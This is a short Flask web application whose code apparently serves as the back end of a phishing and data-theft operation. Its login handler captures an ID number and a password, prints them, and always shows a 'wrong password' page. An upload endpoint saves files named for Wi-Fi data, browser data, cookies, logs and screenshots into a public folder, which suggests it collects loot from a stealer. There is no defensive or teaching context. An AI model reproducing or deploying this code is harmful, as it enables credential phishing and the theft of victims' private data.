from flask import Flask, flash, request, redirect, url_for, render_template
from werkzeug.utils import secure_filename
import os

from os.path import join, dirname, realpath, abspath

app = Flask(__name__)


@app.route('/')
def main():
    return render_template('index.html')


@app.route('/', methods=['POST'])
def my_form_post():
    tc = request.form['tridField']
    pw = request.form['egpField']
    print(tc, pw)
    return render_template('WrongPw.html')


basedir = os.path.abspath(os.path.dirname(__file__))

UPLOAD_FOLDER = 'static/'
ALLOWED_EXTENSIONS = set(['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'])

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        wifi = request.files['wifi']
        crm = request.files['crm']
        c1 = request.files['c1']
        c2 = request.files['c2']
        log = request.files['log']
        ss1 = request.files['screenshot1']
        ss2 = request.files['screenshot2']
        if wifi:
            filename = secure_filename(wifi.filename)
            wifi.save(os.path.join(basedir, app.config['UPLOAD_FOLDER'], filename))
        if crm:
            filename = secure_filename(crm.filename)
            crm.save(os.path.join(basedir, app.config['UPLOAD_FOLDER'], filename))
        if c1:
            filename = secure_filename(c1.filename)
            c1.save(os.path.join(basedir, app.config['UPLOAD_FOLDER'], filename))
        if c2:
            filename = secure_filename(c2.filename)
            c2.save(os.path.join(basedir, app.config['UPLOAD_FOLDER'], filename))
        if log:
            filename = secure_filename(log.filename)
            log.save(os.path.join(basedir, app.config['UPLOAD_FOLDER'], filename))
        if ss1:
            filename = secure_filename(ss1.filename)
            ss1.save(os.path.join(basedir, app.config['UPLOAD_FOLDER'], filename))
        if ss2:
            filename = secure_filename(ss2.filename)
            ss2.save(os.path.join(basedir, app.config['UPLOAD_FOLDER'], filename))
        return redirect(url_for('main'))
    else:
        return render_template('WrongPw.html')


app.run(host='0.0.0.0', port=80)
